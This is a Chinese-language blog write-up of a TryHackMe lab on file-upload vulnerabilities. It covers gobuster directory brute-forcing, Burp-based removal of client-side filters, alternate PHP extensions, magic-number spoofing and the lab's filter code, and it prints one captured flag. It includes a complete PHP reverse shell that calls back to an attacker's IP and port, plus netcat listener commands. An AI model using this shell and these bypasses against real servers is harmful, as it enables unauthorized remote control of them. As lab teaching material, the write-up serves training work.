---
title: 常见Web漏洞之-上传漏洞
icon: book
order: 4
author: Miktu
date: 2024-07-22
category:
  - TryHackMe
tags:
  - network
  - 渗透
sticky: true
star: true
copyright: MikTu
---

# 入门
入门部分介绍了在`/etc/hosts`文件配置中将一个IP解析为多个域名的方式：

```bash
10.10.10.10  overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm
```

##  介绍

文件上传漏洞：常见与图片上传、云存储上传、Github上传等
文件上传可以通过上传并执行webshell控制目标主机，或者检索服务器上的数据。


##  一般利用方法

如果在网站上有一个文件上传漏洞，我们如何找到并利用它？

首先需要通过目录爆破工具爆破web网站目录，找到所有可能存在的网页，并在这些网页中找到可能利用的点，并逐一尝试。

常用工具：
- burpsuite ： 请求拦截
- wappalyser ： 发现网站架构和语言
- gobuster： 目录爆破
 

# 远程文件上传

首先查看网站源码，发现可覆盖的文件，并通过网站存在的文件上传点，上传与预覆盖文件相同名称的图片。

##  练习

![](../images/Pasted%20image%2020240806215610.png)

# 远程代码执行

远程代码执行（Remote Code Execution），顾名思义，将允许我们在Web服务器上任意执行代码。
此类漏洞常见于`PHP`，然而，在最近的时间，其他后端语言已经变得更加常见（`Python Django`和`Node.js`中的`JavaScript`等）。

常见利用方式：
- `webshell` 
    当一些应用限制了上传文件的长度，或防火墙规则限制了任何基于网络的shell时，可以使用webshell
- `reverse/bind shell`
    是攻击者优先选择的理想shell.

##   练习
### 网站目录爆破

```bash
gobuster dir -u http://demo.uploadvulns.thm -w /user/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```ad-info
title: 注意
爆破结果中会列出目录，并标注状态码为301（Status:301）,301代表永久重定向，在此可以认为网页存在（网站设置了路由，而不是直接可以从URL访问的目录）
```
### 上传图片测试上传功能
![](../images/Pasted%20image%2020240806222749.png)

### 修改并将`php-reverse-shell`上传至服务器
`php-reverse-shell`
```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

### 本地监听端口
```bash
nc -nvlp 1234  # 端口需与php-reverse-shell脚本中的端口一致
```

### 获取控制
- 通过访问`php-reverse-shell`文件,进行`shell`反弹
- 本地监听`1234`端口的`terminal`中连接远程服务器`shell`


![](../images/Pasted%20image%2020240806222815.png)

# 过滤（Filtering）

一般开发人员通过“**过滤**“的方式防御`上传漏洞`。
- 客户端过滤
    - 对于web应用程序，客户端指定是用户使用的浏览器。
    - 在`javascript` 等前端语言中进行过滤，浏览器访问网站时会下载`javascript`，并在浏览器执行。
    - 此种过滤方式容易被绕过
- 服务器过滤
    - 服务器过滤，是指在服务器上进行过滤，更难绕过
    - 常见语言包括：`PHP`、`IIS`、`C#`、`Node.js`、`Python`、`Ruby on Rails` 等

**过滤类型** 

- 通过扩展名过滤
    - 只对扩展名进行过滤，非常容易绕过。
    - 常见的方式是`黑名单`或`白名单`
- 文件类型过滤
    - MIME（Multipurpose Internet Mail Extension）多用途互联网邮件扩展类型
        最初用于电子邮件传输时对文件标识，现在也在HTTP(S)文件传输时使用。文件上传时的头部会有文件类型标识：
        ![](../images/Pasted%20image%2020240806224804.png)
    - MIME是基于文件的扩展名的，因此横容易被绕过
- Magic Number验证
    - 读取文件开头的一段字符，识别文件类型
        ![](../images/Pasted%20image%2020240806225146.png)
- 文件长度过滤
    - 对上传文件的大小进行限制（如果一个shell文件是`5.4kb`,但web应用只允许上传`2kb`大的文件，那攻击者需要找一个小于等于`2kb`的替代`shell`）。
- 文件内容过滤
    - 更复杂的过滤需要扫描文件内容，对文件内容包含敏感信息的文件进行过滤。

```ad-info
title: 注意
这些过滤器本身都不是完美的-它们通常会相互结合使用，提供多层过滤器，从而显着提高上传的安全性。不同的框架和语言都有自己固有的过滤和验证上传文件的方法。因此，可能会出现特定语言的漏洞;例如，在PHP主要版本5之前，可以通过向恶意.php文件附加空字节，后跟有效扩展名来绕过扩展名过滤器。最近，也可以将PHP代码注入到其他有效图像文件的exif数据中，然后强制服务器执行它。如果你感兴趣，欢迎进一步研究这些内容。
```

![](../images/Pasted%20image%2020240806230050.png)


## 客户端过滤

有四种简单的方法可以绕过您的平均客户端文件上传过滤器：

- **关闭浏览器中的`JavaScript`：** 
    在网站不需要`JavaScript`来提供基本功能的时候，通过关闭浏览器中的`JavaScript`来实现绕过

- **拦截并修改请求页面：**
    使用`Burpsuite`，我们可以拦截传入的网页，并在它有机会运行之前剥离`JavaScript`过滤器。

- **拦截并修改上传的文件：**
    此方法允许网页正常加载，但在文件上传已经通过（并被过滤器接受）之后，拦截文件上传，修改文件后缀。

- **将文件直接发送到上传点：** 
    当你可以直接使用像`curl`这样的工具发送文件时，则不使用带有过滤器的网页。将数据直接发布到包含处理文件上传代码的页面是完全绕过客户端过滤器的另一种有效方法。在本教程中，我们不会对这个方法进行任何真实的深入的介绍，但是，这样一个命令的语法看起来像这样：
    ```bash
    curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>
    ```
    要使用此方法，您首先要拦截成功的上传（使用Burpsuite或浏览器控制台），以查看上传中使用的参数，然后可以将其插入上述命令。


###  练习
本次练习的是绕过客户端过滤

#### 找到上传界面
此时找一个`jpg`文件上传，会报`invalid file type`（无效的文件类型）：
![](../images/Pasted%20image%2020240807173121.png)

#### 绕过过滤
- 查看页面源码，是否在界面限制上传文件类型
    结果发现页面源码中未发现上传文件过滤;但是引用了多个`javascript`文件：
    ![](../images/Pasted%20image%2020240807163308.png)

- 其中一个`<script src="assets/js/client-side-filter.js"></script>`对上传文件类型做了白名单过滤，只允许`image/png`类型的文件上传：

```javascript
window.onload = function(){
	var upload = document.getElementById("fileSelect");
	var responseMsg = document.getElementsByClassName("responseMsg")[0];
	var errorMsg = document.getElementById("errorMsg");
	var uploadMsg = document.getElementById("uploadtext");
	upload.value="";
	upload.addEventListener("change",function(event){
		var file = this.files[0];
		responseMsg.style = "display:none;";
		if (file.type != "image/png"){
			upload.value = "";
			uploadMsg.style = "display:none;";
			error();
		} else{
			uploadMsg.innerHTML = "Chosen File: " + upload.value.split(/(\\|\/)/g).pop();
			responseMsg.style="display:none;";
			errorMsg.style="display:none;";
			success();
		}
	});
};
```

- 打开burpsuite拦截请求包

    **刷新界面，并查看拦截返回界面，向下滚动到“`Do Intercept`”，然后选择“`Response to this request`”：**
    ![](../images/Pasted%20image%2020240807175111.png)
- 获得返回界面代码
    ![](../images/Pasted%20image%2020240807174208.png)

```ad-info
title: 注意
此时burpsuite拦截到服务器返回的界面，就是浏览器看到的界面（上传界面），此时需要删除的`script`标签就是刚才我们在网站页面源码中看到的那部分：
`<script src="assets/js/client-side-filter.js"></script>`
```

- 删除对应的`script`标签：

    ![](../images/Pasted%20image%2020240807170910.png)

-  点击`Forward`按钮，重新上传文件，成功：
    ![](../images/Pasted%20image%2020240807172950.png)

#### 获取Flag
##### 修改shell

修改`php-reverse-shell`  的ip地址和端口为本地地址和监听端口见： [此处](#修改并将`php-reverse-shell`上传至服务器)
![](../images/Pasted%20image%2020240807182018.png)
##### 上传shell
- burpsuite开启拦截
- 刷新上传界面
- `Forward` 发送请求
- 删除返回界面代码引用的过滤规则对应的`script`标签
- `Forward` 按钮前进
- 上传`webshell`
    ![](../images/Pasted%20image%2020240807183003.png)
##### 获得flag
监听本地端口（对应`php-reverse-shell`中的端口号）：j a va

```bash
nc -lnvp 1234
```

点击已上传的`php-reverse-shell`执行，成功反弹：
![](../images/Pasted%20image%2020240807184617.png)

找到`flag`文件，并获取`flag` ：

![](../images/Pasted%20image%2020240807184742.png)


#### 答案 

```bash
THM{NDllZDQxNjJjOTE0YWNhZGY3YjljNmE2}
```

## 服务器端过滤

###  文件扩展名过滤
#### 第一部分
在本任务的第一部分，我们将看看一个网站，它使用文件扩展名黑名单作为服务器端过滤器。有多种不同的编码方式，我们使用的旁路取决于此。在真实的世界中，我们看不到它的代码，但对于这个例子，它将包含在这里：

```php
<?php       
    //Get the extension       
    $extension = pathinfo($_FILES["fileToUpload"]["name"])["extension"];       //Check the extension against the blacklist -- .php and .phtml       switch($extension){
        case "php":
        case "phtml":
        case NULL: 
            $uploadFail = True;
            break;
        default:
            $uploadFail = False;
    }   
?>
```

在本例中，代码查找文件名中的最后一个句点（`.`），并使用它来确认扩展名，因此这就是我们在这里尝试绕过的内容。代码可以工作的其他方式包括：搜索文件名中的第一个句点，在每个句点处拆分文件名并检查是否有任何列入黑名单的扩展名。我们稍后将讨论后一种情况，但与此同时，让我们集中精力在这里的代码上。

我们可以看到代码过滤掉了`.php`和`.phtml`扩展，所以如果我们想上传一个PHP脚本，我们必须找到另一个扩展。PHP的[维基百科页面](https://en.wikipedia.org/wiki/PHP)为我们提供了一些可以尝试的常见扩展;然而，实际上还有各种其他更少使用的扩展，但Web服务器可能仍然可以识别。其中包括：`.php3`、`.php4`、`.php5`、`.php7`、`.phps`、`.php-s`、`.pht`和`.phar`。其中许多都绕过了过滤器（它只阻止`.php`和`.phtml`），但似乎服务器被配置为不将它们识别为PHP文件，如下面的示例所示：
![](../images/Pasted%20image%2020240807190019.png)

这实际上是 Apache2 服务器的默认设置；但是，系统管理员可能已更改默认配置（或者服务器可能已过时），因此值得尝试。在试过所有shell后，最终我们发现`.phar`扩展绕过了过滤器，并且工作了。从而给了我们shell：
![](../images/Pasted%20image%2020240807190229.png)

#### 第二部分

让我们看看另一个例子，使用不同的过滤器。这一次，我们将完全黑盒：即没有源代码。再通过爆破找到上传界面：
![](../images/Pasted%20image%2020240807190401.png)

我们先从一个完全合法的上传开始。让我们尝试上传之前的`spaniel.jpg`图像：
![](../images/Pasted%20image%2020240807190428.png)

这告诉我们JPEGS至少是被接受的。让我们选择一个我们可以肯定会被拒绝的程序（shell.php）：
![](../images/Pasted%20image%2020240807190450.png)


从这里我们进一步列举，尝试上面的技术，只是一般地试图了解过滤器将接受或拒绝什么。
在本例中，我们尝试所有的shell扩展名，未发现既能上传又可以被执行的shell。

在前面的例子中，我们看到代码使用`pathinfo()`PHP函数来获取`.`后面的最后几个字符，但是如果它对输入的过滤略有不同，会发生什么呢？

让我们尝试上传一个名为`shell.jpg.php`的文件。我们已经知道JPEG文件是可以接受的，那么如果过滤器只是检查`.jpg`文件扩展名是否在输入中呢？


这种过滤器的伪代码可能看起来像这样：

```php
`ACCEPT FILE FROM THE USER -- SAVE FILENAME IN VARIABLE userInput   
IF STRING ".jpg" IS IN VARIABLE userInput:       
    SAVE THE FILE   
ELSE:       
    RETURN ERROR MESSAGE`
```

当我们尝试上传文件时，我们会收到一条成功消息。导航到/uploads目录确认有效负载已成功上传：
![](../images/Pasted%20image%2020240807190931.png)

激活它，我们将收到shell：
![](../images/Pasted%20image%2020240807190949.png)

这绝不是与文件扩展名相关的上传漏洞的详尽列表。就像黑客攻击中的所有事情一样，我们希望利用别人编写的代码中的缺陷;这些代码很可能是为手头的任务而编写的。这是从这个任务中真正重要的一点：在编程时，有一百万种不同的方法来实现相同的功能-您的开发必须根据手头的过滤器进行调整。

*绕过任何类型的服务器端过滤器的关键是枚举并查看哪些是允许的，以及哪些是阻止的;然后尝试创建一个可以通过过滤器正在寻找的标准的有效负载。*


####  练习
现在轮到你了你现在应该知道怎么做了：
- 找出并绕过过滤器来上传并激活一个`shell`。
- 您的标志位于`/var/www/`。您访问的网站是 `annex.uploadverns.thm`。
请注意，此任务还首次实施了随机命名方案。目前，您应该可以轻松找到您的 shell，但请注意，目录并不总是可索引的...

##### 找到上传点
 访问网站，发现首页就是一个命令行，有upload字样，按提示尝试执行help：查看帮助，并逐一尝试各命令的功能。
![](../images/Pasted%20image%2020240807191836.png)

- 查看网站页面源码，发现引用了`script` 标签，查看这些引用的`js`文件，未发现有用价值：
    - `/assets/js/jquery.terminal.min.js`
        jQuery Terminal，官网`https://terminal.jcubic.pl`
        
     

**目录爆破** 找到两个网站目录，尝试访问发现网站资源:
```bash
gobuster dir -u http://annex.uploadvulns.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
...

/privacy (Status: 301)
/assets (Status: 301)
...
```

- `/privacy` 目录
    ![](../images/Pasted%20image%2020240807193212.png)
- `/assets` 目录
    ![](../images/Pasted%20image%2020240807193027.png)
    - `/assets/images`
        ![](../images/Pasted%20image%2020240807193128.png)
##### 上传文件
尝试上传`jpg` 文件,提示:`File Uploaded Successfully`
```bash
select # 选择文件 
chosen # 输出选定文件的名称
upload # 上传文件

```

![](../images/Pasted%20image%2020240807194508.png)

逐一访问已知的网站路径，发现上传的图片在`/privacy`目录下：
![](../images/Pasted%20image%2020240807194752.png)

- 尝试上传`.php` 文件,提示:`File Type is Invalid`
- 尝试上传`.phtml` 文件，上传成功
    ![](../images/Pasted%20image%2020240807195626.png)
    尝试执行，报错：
    ![](../images/Pasted%20image%2020240807195702.png)
- 尝试上传`.phphtml`,上传成功
    ![](../images/Pasted%20image%2020240807195306.png)
- 点击执行，反弹成功
    ![](../images/Pasted%20image%2020240807195334.png)
- 获取flag
    ![](../images/Pasted%20image%2020240807195435.png)
    ![](../images/Pasted%20image%2020240807195447.png)
### Magic Numbers 过滤

`Magic Numbers`可用作更准确的文件标识符。文件的`Magic Numbers`是一串十六进制数字，并且始终是文件中的第一个数字。了解了这一点，就可以使用`Magic Numbers`来验证文件上传，只需读取前几个字节并将其与白名单或黑名单进行比较即可。

```ad-hint
title:注意
请记住，这种技术对基于 PHP 的 Web 服务器非常有效；但是，它有时可能会对其他类型的 Web 服务器失败。
```

####  示例

假设我们有一个上传页面：
![](../images/Pasted%20image%2020240808203608.png)

如果我们上传我们的标准`shell.php`文件，我们会得到一个错误;然而，如果我们上传JPEG，网站就可以了。到目前为止，一切都按照预期进行。

从之前的上传尝试中，我们知道JPEG文件是可以接受的，所以让我们尝试将JPEG`Magic Numbers`添加到`shell.php`文件的顶部。快速浏览一下[维基百科上的文件签名列表](https://en.wikipedia.org/wiki/List_of_file_signatures)，我们会发现JPEG文件有几种可能的`Magic Numbers`。我们在这里使用哪一个并不重要，所以让我们选择一个（`FF D8 FF DB`）。我们可以直接将这些数字的ASCII表示（ASCII字符串）添加到文件的顶部，但直接使用十六进制表示通常更容易，因此让我们来介绍该方法。

 在开始之前，让我们使用Linux`file`命令来检查shell的文件类型：
![](../images/Pasted%20image%2020240808203833.png)
 让我们打开反向shell脚本，在第一行添加四个随机字符。这些字符并不重要，所以在这个例子中，我们只使用四个“A“：
![](../images/Pasted%20image%2020240808203924.png)

保存文件并退出。接下来，我们将在`hexeditor`（Kali默认）或任何其他允许您查看和编辑hex shell的工具中重新打开该文件。在hexeditor中，文件看起来像这样：
![](../images/Pasted%20image%2020240808204000.png)

注意红色框中的四个字节：它们都是`41`，这是大写字母“A”的十六进制代码--正是我们之前在文件顶部添加的。将其更改为我们之前为JPEG文件找到的神奇数字：`FF D8 FF DB`
![](../images/Pasted%20image%2020240808204130.png)

现在，如果我们保存并退出文件（Ctrl + x），我们可以使用再一次，看到我们已经成功地欺骗了shell的文件类型：
![](../images/Pasted%20image%2020240808204220.png)

完美了现在让我们尝试上传修改后的shell，看看它是否绕过过滤器！
![](../images/Pasted%20image%2020240808204308.png)

这样就完成了--我们绕过了服务器端的幻数过滤器，得到了一个反向shell。前往`magic.uploadvulns.thm` --最后一个小挑战的时间到了。

这将是最后一个示例网站，你必须在任务11的挑战之前破解;因此，我们再次加强基本安全级别。上一个任务中的网站实现了更改的命名方案，将上传的日期和时间前置到文件名中。此任务将不会这样做，以保持相对容易;但是，目录索引已关闭，因此您将无法导航到包含上载的目录。相反，您需要使用其URL直接访问shell。
绕过`magic number`过滤器上传shell。找到上传的shell的位置并激活它。你的标志在`/var/www/`。

##### 信息收集
使用`gobuser` 进行目录爆破：
```bash
 gobuster dir -u http://magic.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

发现3个目录：
```bash
/graphics (Status: 301)
/assets (Status: 301)
/server-status (Status: 403)
```

访问三个目录都报错：
![](../images/Pasted%20image%2020240808211007.png)

挑战开始前提示：**但是，目录索引已关闭，因此您将无法导航到包含上载的目录。相反，您需要使用其URL直接访问shell**
因此目录是存在的，但是无法导航;根据经验或查看页面源码，可知/assets 目录下保存的是网站的样式代码：`js`代码和背景图片等。因此猜测`/graphics`目录是上传目录。

访问网站首页，选择背景图片空白处，右键复制背景图片连接，发现其路径是：`http://magic.uploadvulns.thm/assets/images/background.jpg`
网站右上角有文件上传字样，点击可以选择上传文件。

**总结线索**
- `/graphics` 疑是文件上传路径
- `/assets/images/background.jpg` 背景图片路径
- 无法导航到目录，只能导航到文件
- 上传点在首页右上角
#####  验证上传点和上传文件路径
**尝试下载背景图片保存到本地，成功：**
![](../images/Pasted%20image%2020240808212536.png)

**修改名称，尝试上传并访问图片**
未上传成功报错`request entity too large` 请求实体太大，显然需要上传更小的文件

**创建一个jpg文件：**

首先创建一个php文件：
```php
AAAA
<?php
echo 'hello,world';
?>
```

然后利用 `hexeditor`修改`Magic Number` 为：`FF D8 FF E0`

```bash 
hexeditor test.php 
```

file 命令查看文件属性：

![](../images/Pasted%20image%2020240808215022.png)

尝试上传，未成功，提示未选中文件，可能是文件太小，尝试修改从网站上下载的文件：
```bash
convert background.jpg  -resize 30% hello.jpg
```

任然为上传成功，显示错误信息：`Internal Server Error`，多次尝试任然报错，怀疑靶场故障，重启靶场再试，提示：`gifs only please！`：
![](../images/Pasted%20image%2020240808224615.png)

查找`gifs magic number`  ，发现两个，任意选一个``47 49 46 38 37 61``
![](../images/Pasted%20image%2020240808224855.png)

修改`background.jpg`文件`magic number`:
![](../images/Pasted%20image%2020240808225137.png)


尝试上传,上传成功:
![](../images/Pasted%20image%2020240808225255.png)

##### 反弹并获取`flag`
修改webshell.php文件并上传，
![](../images/Pasted%20image%2020240808225556.png)

访问文件进行反弹，反弹成功，查看`/var/www/flag.txt`获取flag：
![](../images/Pasted%20image%2020240808230032.png)

##### 答案
![](../images/Pasted%20image%2020240808230238.png)



# 完整的黑盒上传挑战
工具：
- 使用浏览器扩展`Wappalyzer` 
- burpsuite拦截响应，例如`server`或`x-powered-by`头可以用来获取有关服务器的信息。
- `gobuster` 爆破目录
    - 这里一个重要的Gobuster 参数`-x`开关，它可用于查找具有特定扩展名的文件。例如，如果您将`-x php,txt,html`添加到Gobuster命令中，该工具将向选定单词列表中的每个单词追加`.php`、`.txt`和`.html`
步骤：
- 找到上传页面
- 查看客户端脚本源码，以确定是否有任何可以绕过的方式。
- 尝试上传正常的文件，看如何访问到他
- 如果恶意文件被停止，可以使用以下方法来确定可能存在什么样的服务器端过滤：
    - 如果可以成功上传一个扩展名无效的文件（例如`testingimage.invalidfileextension`）那么服务器正在使用黑名单来过滤可执行文件。
    - 如果上传一个扩展名无效的文件失败，则是使用的白名单。
    - 上传一个正常的文件，并将`magic Number`改为你希望的数值：
        - 如果失败，服务是基于`Magic Number`的过滤器
    - 尝试上传正常的文件，但使用`Burpsuite`拦截并更改`MIME`的类型，如果上传失败，就知道服务器正根据`MIMEtypes`类型过滤。
    - 文件长度过滤，需要通过修改上传文件大小来判断。
## 挑战开始

访问：`jewel.uploadvulns.thm`
10.10.106.250
## 发现上传点
- 上传点： 首页
    ![](../images/Pasted%20image%2020240809225745.png)
## 发现过滤机制
- 页面源码引用`js`文件，对上传文件进行了过滤：
    http://jewel.uploadvulns.thm/assets/js/upload.js
    ```bash
    
			//Check File Size
			if (event.target.result.length > 50 * 8 * 1024){
				setResponseMsg("File too big", "red");			
				return;
			}
			//Check Magic Number
			if (atob(event.target.result.split(",")[1]).slice(0,3) != "ÿØÿ"){
				setResponseMsg("Invalid file format", "red");
				return;	
			}
			//Check File Extension
			const extension = fileBox.name.split(".")[1].toLowerCase();
			if (extension != "jpg" && extension != "jpeg"){
				setResponseMsg("Invalid file format", "red");
				return;
			}
    ```

查看[magic number list]( https://en.wikipedia.org/wiki/List_of_file_signatures)找到`ÿØÿ`对应的文件类型是：`jpg、jpeg`因此可知：
- 此上传点通过`magic number` 和 文件名，对上传文件进行了白名单过滤。
    - 验证文件名过滤：修改文件名，上传报错
    - 验证`magic number` 过滤：修改`magic number` ，报错
    - 通过burpsuite拦截上传，并修改`"type:image/jpeg"`为`"type:image/php"`,上传报错


## 尝试绕过：
删除客户端过滤：
![](../images/Pasted%20image%2020240812221403.png)



- 目录爆破：
```
 gobuster dir -u http://jewel.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```





```bash
/content (Status: 301)
/modules (Status: 301)
/admin (Status: 200)
/assets (Status: 301)
/Content (Status: 301)
/Assets (Status: 301)
/Modules (Status: 301)
/Admin (Status: 200)
```

逐一访问，提示`Page not found!`，网站无法列出目录信息

![](../images/Pasted%20image%2020240809233737.png)

网站语言和架构
![](../images/Pasted%20image%2020240809234856.png)

尝试绕过

    burpsuite 截获响应，删除客户端限制
```
$(document).ready(function(){let errorTimeout;const fadeSpeed=1000;function setResponseMsg(responseTxt,colour){$("#responseMsg").text(responseTxt);if(!$("#responseMsg").is(":visible")){$("#responseMsg").css({"color":colour}).fadeIn(fadeSpeed)}else{$("#responseMsg").animate({color:colour},fadeSpeed)}clearTimeout(errorTimeout);errorTimeout=setTimeout(()=>{$("#responseMsg").fadeOut(fadeSpeed)},5000)}$("#uploadBtn").click(function(){$("#fileSelect").click()});$("#fileSelect").change(function(){const fileBox=document.getElementById("fileSelect").files[0];const reader=new FileReader();reader.readAsDataURL(fileBox);reader.onload=function(event){

			//Check File Size
			if (event.target.result.length > 50 * 8 * 1024){
				setResponseMsg("File too big", "red");			
				return;
			}
			//Check Magic Number
			if (atob(event.target.result.split(",")[1]).slice(0,3) != "ÿØÿ"){
				setResponseMsg("Invalid file format", "red");
				return;	
			}
			//Check File Extension
			const extension = fileBox.name.split(".")[1].toLowerCase();
			if (extension != "jpg" && extension != "jpeg"){
				setResponseMsg("Invalid file format", "red");
				return;
			}


const text={success:"File successfully uploaded",failure:"No file selected",invalid:"Invalid file type"};$.ajax("/",{data:JSON.stringify({name:fileBox.name,type:fileBox.type,file:event.target.result}),contentType:"application/json",type:"POST",success:function(data){let colour="";switch(data){case "success":colour="green";break;case "failure":case "invalid":colour="red";break}setResponseMsg(text[data],colour)}})}})});

```


#  挑战思路
- 正常上传，找到上传目录：爆破
- burpsuite 拦截返回页面，remov 服务器返回的js代码（过滤代码）。

